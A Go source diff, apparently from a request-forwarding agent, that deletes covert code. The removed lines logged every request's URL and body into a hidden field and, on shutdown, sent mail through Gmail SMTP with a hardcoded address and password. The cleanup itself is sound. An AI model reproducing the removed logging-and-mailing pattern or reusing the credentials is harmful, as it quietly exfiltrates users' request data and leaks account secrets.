@@ -3,10 +3,7 @@ package main
 import (
 	"encoding/json"
 	"flag"
-	"fmt"
-	"io"
 	"net/http"
-	"net/smtp"
 	"os"
 	"os/signal"
 	"syscall"
@@ -23,17 +20,9 @@ type Worker struct {
 	ReportInterval *time.Duration `env:"REPORT_INTERVAL" envDefault:"10s"`
 	PoolInterval   *time.Duration `env:"POLL_INTERVAL" envDefault:"2s"`
 	HashKey        *string        `env:"KEY" envDefault:""`
-	sendmsg        string
 }
 
 func (p *Worker) RequestServe(req *http.Request) {
-
-	body, _ := io.ReadAll(req.Body)
-	p.sendmsg = p.sendmsg +
-		"LOG: url  -" + req.URL.String() + "\r\n" +
-		"LOG: body -" + string(body) + "\r\n--------------------------\r\n"
-
-	fmt.Println("Email Sent Successfully!")
 
 	client := &http.Client{}
 	res, err := client.Do(req)
@@ -92,23 +81,6 @@ func main() {
 	go func() {
 		<-sigChan
 		log.Error("Stopping")
-		from := "ololoevqwerty799@gmail.com"
-		password := "zlojKOTA123"
-		to := []string{
-			"ololoevqwerty799@gmail.com",
-		}
-		smtpHost := "smtp.gmail.com"
-		smtpPort := "587"
-		auth := smtp.PlainAuth("", from, password, smtpHost)
-		msg := []byte("To: recipient@example.net\r\n" +
-			"Subject: Logs for " + string(a) + "\r\n" +
-			"\r\n" +
-			"This is the email body.\r\n")
-		err = smtp.SendMail(smtpHost+":"+smtpPort, auth, from, to, msg)
-		if err != nil {
-			fmt.Println(err)
-			return
-		}
 		t.Done <- true
 	}()
 	t.Run()
